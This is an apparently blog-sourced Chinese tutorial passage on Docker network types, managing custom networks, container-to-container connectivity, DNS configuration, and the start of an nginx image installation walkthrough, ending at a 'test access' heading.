&lt;p&gt;在开始之前，我们需要知道docker的网络类型有哪些&lt;/p&gt;
&lt;h3 id=&#34;网络类型&#34;&gt;网络类型
&lt;/h3&gt;&lt;h4 id=&#34;bridge&#34;&gt;bridge
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;bridge&lt;/code&gt;是Docker默认的网络类型，适用于单个主机上容器之间的通信&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每个容器会获得一个虚拟网卡和私有IP地址&lt;/li&gt;
&lt;li&gt;容器之间可以通过容器名通信&lt;/li&gt;
&lt;li&gt;可以使用&lt;code&gt;-p&lt;/code&gt;参数将容器端口映射到宿主机端口，实现外部访问&lt;/li&gt;
&lt;li&gt;默认的&lt;code&gt;bridge&lt;/code&gt;网络名称就是&lt;code&gt;bridge&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;适用于需要隔离、但仍允许访问外部网络的容器场景&lt;/p&gt;
&lt;h4 id=&#34;host&#34;&gt;host
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;容器与宿主机共享网络栈，不做任何隔离&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;容器没有自己的IP地址&lt;/li&gt;
&lt;li&gt;使用宿主机的IP和端口&lt;/li&gt;
&lt;li&gt;性能更好，网络开销低&lt;/li&gt;
&lt;li&gt;容器中暴露的端口不需要通过&lt;code&gt;-p&lt;/code&gt;映射&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;适用于对网络性能要求极高的场景&lt;/p&gt;
&lt;h4 id=&#34;none&#34;&gt;none
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;容器没有网络连接&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;没有分配IP地址&lt;/li&gt;
&lt;li&gt;不能访问外部网络，也不能与其他容器通信&lt;/li&gt;
&lt;li&gt;除非手动配置网络，否则容器完全断网&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;适用于需要自定义网络配置或完全隔离网络的场景&lt;/p&gt;
&lt;h4 id=&#34;overlay&#34;&gt;overlay
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;用于Docker Swarm集群环境中，支持多主机容器通信&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可跨宿主机连接容器&lt;/li&gt;
&lt;li&gt;基于VXLAN技术封装&lt;/li&gt;
&lt;li&gt;需要Swarm模式支持&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;适用于需要将多个 Docker 主机上的容器连接成一个网络的分布式应用&lt;/p&gt;
&lt;h4 id=&#34;macvlan&#34;&gt;macvlan
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;让容器像宿主机一样，直接拥有局域网内的独立IP&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;容器像物理主机一样直接连接到物理网络&lt;/li&gt;
&lt;li&gt;容器具有独立MAC和IP地址&lt;/li&gt;
&lt;li&gt;可被局域网中的其他设备直接访问&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;适用于容器需要与局域网设备完全对等通信的场景，例如作为局域网服务节点&lt;/p&gt;
&lt;h4 id=&#34;container&#34;&gt;container
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;多个容器共享同一个网络命名空间，通过&lt;code&gt;--network container:&amp;lt;容器名&amp;gt;&lt;/code&gt;实现&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用另一个容器的网络配置&lt;/li&gt;
&lt;li&gt;容器之间通过进程间通信&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;适用于容器需要共享网络堆栈（如日志、监控）的情况&lt;/p&gt;
&lt;h3 id=&#34;查看当前已创建的网络&#34;&gt;查看当前已创建的网络
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker network ls
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250723185658135.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723185658135&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;NETWORK ID&lt;/strong&gt;：网络的唯一标识&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;NAME&lt;/strong&gt;：网络名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DRIVER&lt;/strong&gt;：网络类型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SCOPE&lt;/strong&gt;：作用范围，通常是local(本地网络)或swarm(集群网络)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;创建自定义网络&#34;&gt;创建自定义网络
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker network create -d bridge &amp;lt;网络名称&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;-d&lt;/code&gt;&lt;/strong&gt;：指定网络类型。对于单机环境，&lt;code&gt;bridge&lt;/code&gt;是最常用的类型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker network create -d bridge my-net
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250723185004431.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723185004431&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;删除已定义的网络&#34;&gt;删除已定义的网络
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker network rm &amp;lt;网络名&amp;gt;/&amp;lt;网络ID&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker network rm my-net
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250723185631213.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723185631213&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;连接容器到网络&#34;&gt;连接容器到网络
&lt;/h3&gt;&lt;p&gt;我们可以在启动容器时使用&lt;code&gt;--network&lt;/code&gt;选项将其连接到指定的网络&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run -d --name &amp;lt;容器名称&amp;gt; --network &amp;lt;网络名称&amp;gt; &amp;lt;镜像名称&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg：&lt;/p&gt;
&lt;p&gt;我们创建两个容器并都连接到&lt;code&gt;my-net&lt;/code&gt;网络&lt;/p&gt;
&lt;p&gt;首先创建第一个容器 &lt;code&gt;nginx-1&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run -d --name nginx-1 --network my-net nginx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后创建第二个容器 &lt;code&gt;nginx-2&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run -d --name nginx-2 --network my-net nginx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250723190434746.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723190434746&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;容器间通信&#34;&gt;容器间通信
&lt;/h3&gt;&lt;p&gt;当多个容器连接到同一个自定义网络时，它们可以通过&lt;strong&gt;容器名称&lt;/strong&gt;作为主机名直接互相访问&lt;/p&gt;
&lt;p&gt;我们可以进入一个容器来测试与另一个容器的连通性&lt;/p&gt;
&lt;p&gt;eg：&lt;/p&gt;
&lt;p&gt;进入&lt;code&gt;nginx-1&lt;/code&gt;容器，然后&lt;code&gt;ping nginx-2&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker &lt;span style=&#34;color:#e5c07b&#34;&gt;exec&lt;/span&gt; -it nginx-1 /bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;进入容器后，由于nginx镜像默认没有 &lt;code&gt;ping&lt;/code&gt; 工具，我们需要先安装它：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get update &lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get install -y iputils-ping
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;安装完成后，执行&lt;code&gt;ping&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ping nginx-2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250723190515708.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723190515708&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;可以看到，&lt;code&gt;nginx-1&lt;/code&gt; 能够成功解析 &lt;code&gt;nginx-2&lt;/code&gt; 的名称并与之通信，这证明了容器间的互联已经建立shell&lt;/p&gt;
&lt;h3 id=&#34;查看容器网络信息&#34;&gt;查看容器网络信息
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker inspect &amp;lt;对象ID或名称&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;docker inspect&lt;/code&gt;是一个非常强大的命令，用于查看&lt;strong&gt;容器、镜像、网络、卷等对象的详细底层信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它会返回一段JSON 格式的数据，包含几乎所有属性，比如网络配置、挂载卷、环境变量、启动命令等&lt;/p&gt;
&lt;p&gt;这里我们查看容器的信息，并过滤网络部分：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker inspect &amp;lt;容器ID&amp;gt;/&amp;lt;名称&amp;gt; | grep -A &lt;span style=&#34;color:#d19a66&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;NetworkSettings&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250723191822266.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250723191822266&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;dns配置&#34;&gt;DNS配置
&lt;/h3&gt;&lt;h4 id=&#34;全局配置&#34;&gt;全局配置
&lt;/h4&gt;&lt;p&gt;我们可以为所有Docker容器配置默认的DNS服务器&lt;/p&gt;
&lt;p&gt;这需要在Docker的守护进程配置文件&lt;code&gt;/etc/docker/daemon.json&lt;/code&gt;中添加&lt;code&gt;dns&lt;/code&gt;字段&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-JSON&#34; data-lang=&#34;JSON&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#e06c75&#34;&gt;&amp;#34;dns&amp;#34;&lt;/span&gt;: [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;114.114.114.114&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;8.8.8.8&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;修改此文件后，必须重启 Docker 服务才能生效&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;容器独立配置&#34;&gt;容器独立配置
&lt;/h4&gt;&lt;p&gt;如果只想为某个特定的容器指定 DNS，可以在&lt;code&gt;docker run&lt;/code&gt;时使用相关选项&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;DNS选项&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt; &amp;lt;镜像名称&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;常用DNS选项：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;--dns=&amp;lt;IP地址&amp;gt;&lt;/code&gt;&lt;/strong&gt;：指定容器使用的DNS服务器地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;--dns-search=&amp;lt;域名&amp;gt;&lt;/code&gt;&lt;/strong&gt;：指定DNS搜索域。当查找一个短主机名时，会自动追加这个域名进行尝试&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;--hostname=&amp;lt;主机名&amp;gt;&lt;/code&gt;&lt;/strong&gt;：设置容器内部的主机名&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;eg：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run -it --rm --hostname&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;myhost --dns&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;114.114.114.114  nginx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个命令会启动一个临时的&lt;code&gt;nginx&lt;/code&gt;容器，其主机名为&lt;code&gt;myhost&lt;/code&gt;，使用&lt;code&gt;114.114.114.114&lt;/code&gt;作为DNS服务器&lt;/p&gt;
&lt;h4 id=&#34;常用dns服务器&#34;&gt;常用DNS服务器
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;阿里云公共 DNS&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;223.5.5.5
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;223.6.6.6
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;114 DNS&lt;/strong&gt;（国内知名公共 DNS）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;114.114.114.114
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;114.114.115.115
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Google 公共 DNS&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;8.8.8.8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;8.8.4.4
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Cloudflare DNS&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1.1.1.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1.0.0.1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;OpenDNS&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;208.67.222.222
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;208.67.220.220
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;docker实例安装&#34;&gt;Docker实例安装
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;各种镜像安装过程都大差不差，这里以nginx为例，其他的也能作参考&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;查看可用版本&#34;&gt;查看可用版本
&lt;/h2&gt;&lt;h3 id=&#34;访问nginx镜像库地址&#34;&gt;访问Nginx镜像库地址
&lt;/h3&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://hub.docker.com/_/nginx?tab=tags&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://hub.docker.com/_/nginx?tab=tags
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250722123536066.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250722123536066&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;可以copy的字段是拉取当前版本镜像的命令，下面是一些介绍：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;字段&lt;/th&gt;
          &lt;th&gt;含义&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;Digest&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;每个平台构建出的镜像唯一标识符&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;OS/ARCH&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;表示支持的操作系统和架构&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;Vulnerabilities&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;镜像中检测出的安全漏洞数量&lt;br /&gt;分等级：严重（红）、高（橙）、中（黄）、低（灰）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;Compressed size&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;镜像下载时的压缩大小&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;使用命令查看&#34;&gt;使用命令查看
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker search nginx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;我们一般都使用最新的，也就是latest&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;拉取最新镜像&#34;&gt;拉取最新镜像
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker pull nginx:latest
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250722140134826.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250722140134826&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;查看是否拉取成功&#34;&gt;查看是否拉取成功
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker images
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250722140111160.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250722140111160&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;运行容器&#34;&gt;运行容器
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run --name nginx -p 8080:80 -d nginx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;参数说明：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&amp;ndash;name nginx&lt;/strong&gt;：容器名称改成nginx&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-p 8080:80&lt;/strong&gt;： 端口进行映射，将本地8080端口映射到容器内部的80端口&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-d&lt;/strong&gt;：设置容器在在后台一直运行&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;测试访问&#34;&gt;测试访问
